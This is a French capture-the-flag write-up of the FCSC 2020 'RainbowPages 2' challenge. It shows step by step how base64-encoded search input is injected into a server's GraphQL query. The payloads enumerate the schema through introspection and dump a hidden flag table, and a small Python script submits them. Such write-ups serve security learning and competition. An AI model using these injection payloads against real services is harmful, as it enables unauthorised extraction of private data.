<h1>FCSC 2020 - RainbowPages 2 Writeup</h1>

<br>
<img src="https://img.onii.wtf/i/1bd64.png">
<br><br>

PS : Je me base sur le fait que vous avez flag le premier de la série, je ne ferai pas de wu dessus.

Connectons-nous au challenge.

<img src="https://img.onii.wtf/i/pehmb.png">

<br>

On arrive sur une belle page d'accueil avec un champ et un label nous disant "Search one chef", très bien regardons maintenant le code source de la page

Voici ce qu'on y trouve d'intéressant :
```javascript
function makeSearch(searchInput) {
			if(searchInput.length == 0) {
				alert("You must provide at least one character!");
				return false;
			}

			var searchValue = btoa(searchInput);
			var bodyForm = new FormData();
			bodyForm.append("search", searchValue);

			fetch("index.php?search="+searchValue, {
				method: "GET"
			}).then(function(response) {
				response.json().then(function(data) {
					data = eval(data);
					data = data['data']['allCooks']['nodes'];
					$("#results thead").show()
					var table = $("#results tbody");
					table.html("")
					$("#empty").hide();
					data.forEach(function(item, index, array){
						table.append("<tr class='table-dark'><td>"+item['firstname']+" "+ item['lastname']+"</td><td>"+item['speciality']+"</td><td>"+(item['price']/100)+"</td></tr>");
					});
					$("#count").html(data.length)
					$("#count").show()
				});
			});
		}
		
		$("#clear-btn").click(function() {
			$("#search").val("");
			$("#results tbody").html("");
			$("#results thead").hide();
			$("#count").hide()
			$("#empty").show();
		})

		$("#search-btn").click(function() {
			var content = $('#search').val();
			makeSearch(content);
		})
```

<br>

On y voit quelques trucs intéressants qui peuvent éventuellement nous avancer:
* Notre input est chiffré en base64 avant d'être envoyé au serveur
* La recherche se fait dans le node "allCooks"
* Notre input chiffré est envoyé à `index.php?search=`
    * On va pouvoir faire nos tests à partir de ce champ


<br>

Très bien commençons déjà par observer comment le serveur cherche.

<br>

Il va nous falloir reconstituer la requête faite par le serveur pour pouvoir continuer. Très bien, faisons le point sur les éléments que nous avons sous la main :
* La recherche se fait par nom ou par prénom (comparé au premier challenge)
* Le serveur utilise GraphQL

Essayons d'entrer une lettre comme "s" dans notre champ sur la page d'accueil :

<img src="https://img.onii.wtf/i/g2o45.png">

<br>

Voici le retour, on peut donc déjà imaginer la requête GraphQL executée par le serveur :
```

{ allCooks (filter: {or: [{firstname: {like: "%cequonluientre%"}}, {lastname: {like: "%cequonluientre%"}}])} { nodes { firstname, lastname, speciality, price}}

```

Voilà, maintenant que ceci est fait.

Essayons d'entrer notre payload de recherche pour voir si nous avons une erreur : 
```bash
mizaru@DESKTOP-23T8VRF:~/ptdr$ python RainbowPages.py                                                                   
type your payload here : { allCooks (filter: {or: [{firstname: {like: "%cequonluientre%"}}, {lastname: {like: "%cequonluientre%"}}])} { nodes { firstname, lastname, speciality, price}}                                                        
[+] using payload : eyBhbGxDb29rcyAoZmlsdGVyOiB7b3I6IFt7Zmlyc3RuYW1lOiB7bGlrZTogIiVjZXF1b25sdWllbnRyZSUifX0sIHtsYXN0bmFtZToge2xpa2U6ICIlY2VxdW9ubHVpZW50cmUlIn19XSl9IHsgbm9kZXMgeyBmaXJzdG5hbWUsIGxhc3RuYW1lLCBzcGVjaWFsaXR5LCBwcmljZX19        
response : {"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"%\".","locations":[{"line":1,"column":97}]}]}   
```

Nous avons une restriction sur les guillemets, un StringFilter (qui ne nous gène pas pour la construction de notre payload)
<br>
Essayons maintenant de fermer la requête déjà ouverte, parce que sinon la requête GraphQL ne sera pas interprétée par le serveur.

```
cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}
```

Voyons voir ce que ce payload nous retourne :

```bash
mizaru@DESKTOP-23T8VRF:~/ptdr$ python RainbowPages.py                                                                   
type your payload here : cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}                       
[+] using payload : Y2VxdW9ubHVpZW50cmUlIn19XX0peyBub2RlcyB7IGZpcnN0bmFtZSwgbGFzdG5hbWUsIHNwZWNpYWxpdHksIHByaWNlIH19    
response : {"errors":[{"message":"Syntax Error: Cannot parse the unexpected character \"%\".","locations":[{"line":1,"column":123}]}]} 
```

Evidemment, le StringFilter nous gène, on peut essayer de le bypass en commençant un commentaire à la fin de notre payload ce qui nous donnera :

```
cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}#
```
<br>

Essayons voir maintenant :

```bash
mizaru@DESKTOP-23T8VRF:~/ptdr$ python RainbowPages.py                                                                   
type your payload here : cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}#                      
[+] using payload : Y2VxdW9ubHVpZW50cmUlIn19XX0peyBub2RlcyB7IGZpcnN0bmFtZSwgbGFzdG5hbWUsIHNwZWNpYWxpdHksIHByaWNlIH19Iw==
response : {"errors":[{"message":"Syntax Error: Expected Name, found <EOF>","locations":[{"line":1,"column":288}]}]}
```

Très bien, le string filter ne nous embète plus, mais nous avons un retour plus que dérangeant, il vient du "#", car le serveur ne l'accepte pas.

Passons, essayons de construire notre payload : 

```
cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}{__schema{types{name}}}#
```

Essayons !

```bash
mizaru@DESKTOP-23T8VRF:~/ptdr$ python RainbowPages.py                                                                   
type your payload here : cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}{__schema{types{name}}}#                                                                                                                       
[+] using payload : Y2VxdW9ubHVpZW50cmUlIn19XX0peyBub2RlcyB7IGZpcnN0bmFtZSwgbGFzdG5hbWUsIHNwZWNpYWxpdHksIHByaWNlIH19e19fc2NoZW1he3R5cGVze25hbWV9fX0j                                                                                            
response : {"errors":[{"message":"Syntax Error: Expected Name, found {","locations":[{"line":1,"column":123}]}]}
```

Il n'accepte visiblement pas notre "{", essayons de le retirer : 

```
cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}__schema{types{name}}}#
```

Essayons maintenant : 

```bash
mizaru@DESKTOP-23T8VRF:~/ptdr$ python RainbowPages.py                                                                   
type your payload here : cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}__schema{types{name}}}#
[+] using payload : Y2VxdW9ubHVpZW50cmUlIn19XX0peyBub2RlcyB7IGZpcnN0bmFtZSwgbGFzdG5hbWUsIHNwZWNpYWxpdHksIHByaWNlIH19X19zY2hlbWF7dHlwZXN7bmFtZX19fSM=                                                                                            
response : {"data":{"allCooks":{"nodes":[]},"__schema":{"types":[{"name":"Query"},{"name":"Node"},{"name":"ID"},{"name":"Int"},{"name":"Cursor"},{"name":"CooksOrderBy"},{"name":"CookCondition"},{"name":"String"},{"name":"CookFilter"},{"name":"IntFilter"},{"name":"Boolean"},{"name":"StringFilter"},{"name":"CooksConnection"},{"name":"Cook"},{"name":"CooksEdge"},{"name":"PageInfo"},{"name":"FlagNotTheSameTableNamesOrderBy"},{"name":"FlagNotTheSameTableNameCondition"},{"name":"FlagNotTheSameTableNameFilter"},{"name":"FlagNotTheSameTableNamesConnection"},{"name":"FlagNotTheSameTableName"},{"name":"FlagNotTheSameTableNamesEdge"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
```

ça a fonctionné ! On a réussi à lister les autres nodes ! Parmis eux on y voit quelques uns qui ont un nom intéressant :
* `FlagNotTheSameTableNamesEdge`
* `FlagNotTheSameTableNameCondition`
* `FlagNotTheSameTableNamesOrderBy`
* `FlagNotTheSameTableNamesConnection`
* `FlagNotTheSameTableNameFilter`

<br>

Contrairement à l'ancien challenge, nous n'avons pas le node "FlagById", ce qui veut dire qu'on ne pourra pas le cibler par son ID.

Essayons donc de récupérer les fields de notre table `FlagNotTheSameTableName`: 
```
cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}__type (name: "FlagNotTheSameTableName") {name fields{name type{name kind ofType{name kind}}}}}#
```

Ce qui nous donne en retour : 

```bash

mizaru@DESKTOP-23T8VRF:~/ptdr$ python RainbowPages.py                                                                   
type your payload here : cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}__type (name: "FlagNotTheSameTableName") {name fields{name type{name kind ofType{name kind}}}}}#                                               
[+] using payload : Y2VxdW9ubHVpZW50cmUlIn19XX0peyBub2RlcyB7IGZpcnN0bmFtZSwgbGFzdG5hbWUsIHNwZWNpYWxpdHksIHByaWNlIH19X190eXBlIChuYW1lOiAiRmxhZ05vdFRoZVNhbWVUYWJsZU5hbWUiKSB7bmFtZSBmaWVsZHN7bmFtZSB0eXBle25hbWUga2luZCBvZlR5cGV7bmFtZSBraW5kfX19fX0j                                                                                                                    
response : {"data":{"allCooks":{"nodes":[]},"__type":{"name":"FlagNotTheSameTableName","fields":[{"name":"nodeId","type":{"name":null,"kind":"NON_NULL","ofType":{"name":"ID","kind":"SCALAR"}}},{"name":"id","type":{"name":null,"kind":"NON_NULL","ofType":{"name":"Int","kind":"SCALAR"}}},{"name":"flagNotTheSameFieldName","type":{"name":"String","kind":"SCALAR","ofType":null}}]}}} 

```

Et voici le field qui contient notre flag : `flagNotTheSameFieldName`

<br>

Essayons maintenant d'afficher notre flag :

```
cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}allFlagNotTheSameTableNames{nodes{flagNotTheSameFieldName}}}#
```

Testons voir : 

```bash
mizaru@DESKTOP-23T8VRF:~/ptdr$ python RainbowPages.py                                                                   
type your payload here : cequonluientre%"}}]}){ nodes { firstname, lastname, speciality, price }}allFlagNotTheSameTableNames{nodes{flagNotTheSameFieldName}}}#                                                                                  
[+] using payload : Y2VxdW9ubHVpZW50cmUlIn19XX0peyBub2RlcyB7IGZpcnN0bmFtZSwgbGFzdG5hbWUsIHNwZWNpYWxpdHksIHByaWNlIH19YWxsRmxhZ05vdFRoZVNhbWVUYWJsZU5hbWVze25vZGVze2ZsYWdOb3RUaGVTYW1lRmllbGROYW1lfX19Iw==                                        
response : {"data":{"allCooks":{"nodes":[]},"allFlagNotTheSameTableNames":{"nodes":[{"flagNotTheSameFieldName":"FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}"}]}}}  
```

Et voilà, RainbowPagesV2 flagged ^^

# bonus :

Le script que j'ai utilisé pour automatiser mes requêtes est :

```python
#!/usr/bin/python
import requests 
import base64
import time


pld = str(raw_input("type your payload here : "))
conc = base64.b64encode(pld)
print("[+] using payload : %s" % conc)

time.sleep(3)

r = requests.get("http://challenges2.france-cybersecurity-challenge.fr:5007/?search=%s" % conc)

print("response : " + r.content)
```


